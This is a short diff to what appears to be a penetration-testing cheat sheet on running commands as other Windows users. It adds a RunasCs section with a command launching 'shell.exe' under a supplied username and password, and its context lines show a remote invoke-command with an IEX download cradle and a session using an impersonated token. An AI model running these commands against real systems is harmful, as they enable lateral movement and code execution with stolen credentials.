@@ -12,6 +12,14 @@ invoke-command -Computer ComputerHostname -Credential $cred -ScriptBlock { IEX(N
 change ComputerHostname.
 `-ConfigurationName ...` parameter might be required to run commands for special restricted user permissions
 
+### with RunasCs
+https://github.com/antonioCoco/RunasCs
+available as a powershell script or a C# program in the releases.
+The C# program works even if windows remote management is disabled.
+```dos
+runascs Username Password C:\path\to\file\shell.exe
+```
+
 ### on remote machine with impersonated token
 ```powershell
 $sess = New-PSSession -computer ComputerHostname
